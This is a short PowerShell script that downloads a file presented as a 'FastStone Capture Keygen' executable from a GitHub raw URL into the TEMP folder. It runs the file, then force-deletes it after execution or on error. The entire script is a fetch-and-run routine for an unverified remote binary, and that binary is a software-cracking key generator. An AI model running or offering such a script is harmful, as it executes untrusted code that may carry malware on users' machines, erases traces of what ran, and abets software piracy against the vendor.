# Define the URL and destination path
$url = "https://raw.githubusercontent.com/ghostminhtoan/MMT/refs/heads/main/FastStone%20Capture%20Keygen.exe"
$dest = "$env:TEMP\FastStoneCaptureKeygen.exe"

try {
    # Download the file
    Write-Host "Downloading file..."
    Invoke-WebRequest -Uri $url -OutFile $dest
    
    # Execute the file
    Write-Host "Running the executable..."
    $process = Start-Process -FilePath $dest -PassThru
    
    # Wait for the process to exit
    $process.WaitForExit()
    
    # Delete the file
    Write-Host "Deleting the file..."
    Remove-Item -Path $dest -Force
    
    Write-Host "Operation completed successfully."
}
catch {
    Write-Host "An error occurred: $_"
    
    # Attempt to delete the file if it exists (in case of partial download or execution failure)
    if (Test-Path $dest) {
        Remove-Item -Path $dest -Force -ErrorAction SilentlyContinue
    }
}
